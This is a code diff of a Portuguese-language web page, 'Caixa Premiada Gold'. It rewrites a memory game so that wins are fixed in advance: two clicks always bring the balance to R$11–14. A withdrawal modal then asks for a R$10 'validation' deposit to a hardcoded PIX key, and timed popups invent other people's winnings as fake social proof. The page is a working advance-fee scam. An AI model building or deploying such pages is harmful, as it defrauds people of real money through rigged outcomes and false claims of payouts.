@@ -2,213 +2,326 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<title>Caixa Premiada</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Caixa Premiada Gold</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
 <style>
-body {
-  font-family: Arial, sans-serif;
-  background: radial-gradient(circle, #111, #000);
-  color: #fff;
-  text-align: center;
-  padding: 20px;
-}
+  :root {
+    --gold: #ffcc00;
+    --win: #00ff88;
+    --bg: #050505;
+    --card-bg: #121212;
+  }
 
-#instrucoes {
-  background: #1c1c1c;
-  border-radius: 10px;
-  padding: 15px;
-  max-width: 520px;
-  margin: 10px auto 20px;
-  font-size: 14px;
-}
+  * { box-sizing: border-box; font-family: 'Segoe UI', Roboto, sans-serif; }
 
-/* 🔥 CONTAINER GERAL */
-#game {
-  position: relative;
-  width: 520px;
-  margin: auto;
-}
+  body {
+    background: var(--bg);
+    color: #fff;
+    margin: 0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
 
-/* TABULEIRO */
-#board {
-  position: relative;
-  width: 520px;
-  height: 420px;
-  margin: auto;
-  z-index: 1;
-}
+  /* NOTIFICAÇÃO DE GANHOS (PROVA SOCIAL) */
+  #popup-ganhos {
+    position: fixed;
+    top: 70px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: rgba(0, 255, 136, 0.9);
+    color: #000;
+    padding: 8px 15px;
+    border-radius: 20px;
+    font-size: 0.8rem;
+    font-weight: bold;
+    z-index: 1000;
+    display: none;
+    box-shadow: 0 0 15px rgba(0,255,136,0.5);
+  }
 
-/* STATUS SEMPRE NA FRENTE */
-#status {
-  position: relative;
-  z-index: 10;
-  margin-top: 15px;
-  font-size: 16px;
-  min-height: 40px;
-}
+  /* HEADER */
+  #header {
+    width: 100%;
+    background: #000;
+    padding: 15px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    border-bottom: 1px solid #333;
+    position: sticky;
+    top: 0; z-index: 100;
+  }
 
-/* CAIXAS */
-.box {
-  position: absolute;
-  width: 90px;
-  height: 80px;
-  background: linear-gradient(135deg, #ff9800, #ff5722);
-  border-radius: 12px;
-  font-size: 18px;
-  font-weight: bold;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  cursor: pointer;
-  transition: left 0.6s ease, top 0.6s ease, opacity 0.3s;
-  z-index: 2;
-}
+  .balance-display {
+    background: #1a1a1a;
+    padding: 10px 20px;
+    border-radius: 30px;
+    border: 1px solid var(--gold);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
 
-.box:hover { transform: scale(1.05); }
-.box.disabled { pointer-events: none; opacity: 0.4; }
-.box.win { background: linear-gradient(135deg, #00e676, #00c853); }
-.box.empty { background: #333; }
+  .balance-value { color: var(--gold); font-weight: bold; font-size: 1.2rem; }
+
+  /* GAME AREA */
+  #game-container {
+    width: 95%;
+    max-width: 500px;
+    margin-top: 20px;
+  }
+
+  #status {
+    text-align: center;
+    margin-bottom: 15px;
+    color: var(--gold);
+    font-size: 1.1rem;
+    font-weight: bold;
+    text-shadow: 0 0 5px rgba(255,204,0,0.3);
+  }
+
+  #board {
+    display: grid;
+    grid-template-columns: repeat(5, 1fr);
+    gap: 8px;
+    perspective: 1000px;
+  }
+
+  .box {
+    aspect-ratio: 1/1;
+    cursor: pointer;
+    perspective: 1000px;
+  }
+
+  .box-inner {
+    position: relative;
+    width: 100%; height: 100%;
+    transition: transform 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    transform-style: preserve-3d;
+  }
+
+  .box.flipped .box-inner { transform: rotateY(180deg); }
+
+  .box-front, .box-back {
+    position: absolute;
+    width: 100%; height: 100%;
+    backface-visibility: hidden;
+    border-radius: 12px;
+    display: flex; align-items: center; justify-content: center;
+  }
+
+  .box-front {
+    background: linear-gradient(145deg, #1e1e1e, #0a0a0a);
+    border: 1px solid #333;
+    font-size: 1.5rem;
+    box-shadow: inset 0 0 10px rgba(255,204,0,0.1);
+  }
+
+  .box-back {
+    background: #1a1a1a;
+    transform: rotateY(180deg);
+    border: 2px solid var(--gold);
+    font-weight: bold;
+  }
+
+  .box.win .box-back {
+    background: linear-gradient(135deg, #004d00, #00ff88);
+    color: #fff;
+    border-color: #fff;
+    box-shadow: 0 0 15px var(--win);
+  }
+
+  /* MODAL */
+  #modal-saque {
+    display: none;
+    position: fixed;
+    top: 0; left: 0; width: 100%; height: 100%;
+    background: rgba(0,0,0,0.98);
+    z-index: 2000;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+
+  .modal-content {
+    background: var(--card-bg);
+    padding: 30px;
+    border-radius: 20px;
+    border: 1px solid var(--gold);
+    max-width: 400px; width: 100%;
+    text-align: center;
+  }
+
+  .pix-area {
+    background: #000;
+    border: 1px dashed var(--gold);
+    padding: 15px;
+    margin: 20px 0;
+    font-size: 1.2rem;
+    color: var(--gold);
+    font-family: monospace;
+    cursor: pointer;
+  }
+
+  .btn-main {
+    background: var(--gold);
+    color: #000;
+    border: none;
+    padding: 18px;
+    border-radius: 12px;
+    font-weight: bold;
+    width: 100%;
+    font-size: 1.1rem;
+    text-transform: uppercase;
+    cursor: pointer;
+  }
+
+  /* ANIMAÇÃO DE SHAKE */
+  @keyframes shake {
+    0% { transform: translateX(0); }
+    25% { transform: translateX(5px); }
+    50% { transform: translateX(-5px); }
+    75% { transform: translateX(5px); }
+    100% { transform: translateX(0); }
+  }
+  .shake { animation: shake 0.3s ease-in-out; }
 </style>
 </head>
-
 <body>
 
-<h1>🎁 Caixa Premiada</h1>
+<div id="popup-ganhos">Marcos acabou de sacar R$ 14,00 via PIX!</div>
 
-<div id="instrucoes">
-👀 Observe os prêmios por <b>3 segundos</b><br>
-🙈 Depois as caixas fecham e <b>se movem de verdade</b><br>
-🧠 Use a memória e escolha <b>1 caixa</b><br>
-💸 Prêmios: <b>R$1 • R$5 • R$10 • R$20 • R$50 • R$100</b>
+<div id="header">
+  <div style="font-weight: bold; color: var(--gold)">CAIXA GOLD</div>
+  <div class="balance-display">
+    <span class="stat-label">SALDO</span>
+    <span class="balance-value">R$ <span id="label-saldo">0,00</span></span>
+  </div>
 </div>
 
-<div id="game">
+<div id="game-container">
+  <div id="status">Memorize onde estão os R$ 100!</div>
   <div id="board"></div>
-  <div id="status">Memorize os prêmios...</div>
+</div>
+
+<div id="modal-saque">
+  <div class="modal-content">
+    <div style="font-size: 3rem">💰</div>
+    <h2 style="color: var(--win); margin: 10px 0;">SAQUE LIBERADO</h2>
+    <p>Seu saldo de <b style="color:var(--gold); font-size: 1.4rem">R$ <span id="valor-modal">0,00</span></b> está pronto para ser transferido.</p>
+    <div style="background: #222; padding: 10px; border-radius: 10px; font-size: 0.85rem; margin-bottom: 15px;">
+      ⚠️ Para ativar sua chave e liberar o saque, realize o depósito de validação de <b>R$ 10,00</b>.
+    </div>
+    <div style="font-size: 10px; color: #aaa;">CHAVE PIX (CLIQUE PARA COPIAR):</div>
+    <div class="pix-area" onclick="copiarPix()" id="chave-pix">02546917064</div>
+    <button class="btn-main" onclick="copiarPix()">Copiar Chave e Sacar</button>
+  </div>
 </div>
 
 <script>
-/* ================= CONFIG ================= */
-const COLS = 5;
 const TOTAL = 30;
-const BOX_W = 100;
-const BOX_H = 90;
+let saldo = 0;
+let chances = 2;
+let jogoAtivo = false;
 
-/* ================= ESTADO ================= */
-let caixas = [];
-let jogou = false;
-
-const board = document.getElementById("board");
-const status = document.getElementById("status");
-
-/* ================= POSIÇÃO ================= */
-function posicao(index) {
-  return {
-    x: (index % COLS) * BOX_W,
-    y: Math.floor(index / COLS) * BOX_H
-  };
-}
-
-/* ================= GERAR CAIXAS ================= */
-function gerarCaixas() {
-  caixas = Array(TOTAL).fill(null);
-
-  const premios = ["R$1","R$5","R$10","R$20","R$50","R$100"];
-  const posicoes = [...Array(TOTAL).keys()].sort(() => Math.random() - 0.5);
-
-  premios.forEach((premio, i) => {
-    caixas[posicoes[i]] = premio;
-  });
-}
-
-/* ================= CRIAR ELEMENTOS ================= */
-function criarElementos() {
+// Inicialização
+function init() {
+  const board = document.getElementById("board");
   board.innerHTML = "";
-
-  caixas.forEach((valor, index) => {
+  
+  // Criar 30 caixas
+  for (let i = 0; i < TOTAL; i++) {
     const box = document.createElement("div");
-    box.className = "box";
-    box.dataset.index = index;
-
-    const p = posicao(index);
-    box.style.left = p.x + "px";
-    box.style.top = p.y + "px";
-
-    box.innerText = valor ? valor : "🎁";
-    box.onclick = () => escolher(box);
-
+    box.className = "box flipped";
+    // Valores fakes iniciais para memorização
+    const valFake = (Math.random() > 0.8) ? "R$ 100" : "❌";
+    box.innerHTML = `
+      <div class="box-inner">
+        <div class="box-front">🎁</div>
+        <div class="box-back">${valFake}</div>
+      </div>
+    `;
+    box.onclick = () => handleClique(box);
     board.appendChild(box);
-  });
-}
-
-/* ================= MOSTRAR / ESCONDER ================= */
-function mostrarPremios() {
-  document.querySelectorAll(".box").forEach((box, i) => {
-    box.innerText = caixas[i] ? caixas[i] : "🎁";
-  });
-}
-
-function esconderPremios() {
-  document.querySelectorAll(".box").forEach(box => {
-    box.innerText = "🎁";
-  });
-}
-
-/* ================= EMBARALHAR COM MOVIMENTO REAL ================= */
-function embaralhar() {
-  const novaOrdem = [...Array(TOTAL).keys()].sort(() => Math.random() - 0.5);
-
-  novaOrdem.forEach((oldIndex, newPos) => {
-    const box = document.querySelector(`.box[data-index='${oldIndex}']`);
-    const p = posicao(newPos);
-    box.style.left = p.x + "px";
-    box.style.top = p.y + "px";
-    box.dataset.index = newPos;
-  });
-
-  caixas = novaOrdem.map(i => caixas[i]);
-}
-
-/* ================= ESCOLHER ================= */
-function escolher(box) {
-  if (jogou) return;
-  jogou = true;
-
-  document.querySelectorAll(".box").forEach(b => b.classList.add("disabled"));
-
-  const idx = Number(box.dataset.index);
-  const valor = caixas[idx];
-
-  if (valor) {
-    box.classList.add("win");
-    box.innerText = "💰";
-    status.innerHTML =
-      `🎉 <b>PARABÉNS!</b><br>Você ganhou <b>${valor}</b><br>Receba seu Pix 💸`;
-  } else {
-    box.classList.add("empty");
-    status.innerText = "😈 Não foi dessa vez…";
   }
-}
 
-/* ================= START ================= */
-function start() {
-  jogou = false;
-  gerarCaixas();
-  criarElementos();
-
-  status.innerText = "Memorize os prêmios...";
-  mostrarPremios();
-
+  // Sequência de início
   setTimeout(() => {
-    esconderPremios();
-    embaralhar();
-    status.innerText = "Escolha uma caixa 👇";
-  }, 3000);
+    document.querySelectorAll(".box").forEach(b => b.classList.remove("flipped"));
+    document.getElementById("status").innerText = "Embaralhando...";
+    setTimeout(() => {
+      const boxes = Array.from(board.children);
+      boxes.forEach(b => b.style.order = Math.floor(Math.random() * TOTAL));
+      jogoAtivo = true;
+      document.getElementById("status").innerText = "ENCONTRE O PRÊMIO!";
+    }, 1000);
+  }, 2500);
+
+  iniciarPopups();
 }
 
-start();
-</script>
+// Lógica de Ganhos Controlados
+function handleClique(el) {
+  if (!jogoAtivo || chances <= 0 || el.classList.contains("flipped")) return;
 
+  let ganho = 0;
+  if (chances === 2) {
+    ganho = Math.floor(Math.random() * 3) + 4; // R$ 4 a 6
+    document.getElementById("status").innerText = "INCRÍVEL! +1 CHANCE!";
+  } else {
+    const meta = Math.floor(Math.random() * 4) + 11; // Final entre 11 e 14
+    ganho = meta - saldo;
+    document.getElementById("status").innerText = "VOCÊ GANHOU O PRÊMIO MÁXIMO!";
+    jogoAtivo = false;
+    setTimeout(abrirSaque, 1500);
+  }
+
+  saldo += ganho;
+  chances--;
+  
+  el.querySelector(".box-back").innerText = `R$ ${ganho},00`;
+  el.classList.add("flipped", "win");
+  document.getElementById("label-saldo").innerText = saldo.toFixed(2).replace(".", ",");
+  
+  // Efeito de vibração visual
+  document.body.classList.add("shake");
+  setTimeout(() => document.body.classList.remove("shake"), 300);
+}
+
+function abrirSaque() {
+  document.getElementById("valor-modal").innerText = saldo.toFixed(2).replace(".", ",");
+  document.getElementById("modal-saque").style.display = "flex";
+  document.querySelectorAll(".box").forEach(b => b.classList.add("flipped"));
+}
+
+function copiarPix() {
+  const chave = "02546917064";
+  navigator.clipboard.writeText(chave).then(() => {
+    alert("Chave PIX Copiada!\n\nFaça o depósito de R$ 10,00 para liberar seus R$ " + saldo.toFixed(2));
+  });
+}
+
+// Prova Social
+function iniciarPopups() {
+  const nomes = ["Ricardo", "Ana", "Luiz", "Carla", "Bruna", "Felipe", "Marcos"];
+  const popup = document.getElementById("popup-ganhos");
+  
+  setInterval(() => {
+    if (Math.random() > 0.5) {
+      const nome = nomes[Math.floor(Math.random() * nomes.length)];
+      const valor = Math.floor(Math.random() * 5) + 10;
+      popup.innerText = `${nome} acabou de sacar R$ ${valor},00 via PIX!`;
+      popup.style.display = "block";
+      setTimeout(() => popup.style.display = "none", 3000);
+    }
+  }, 7000);
+}
+
+init();
+</script>
 </body>
 </html>
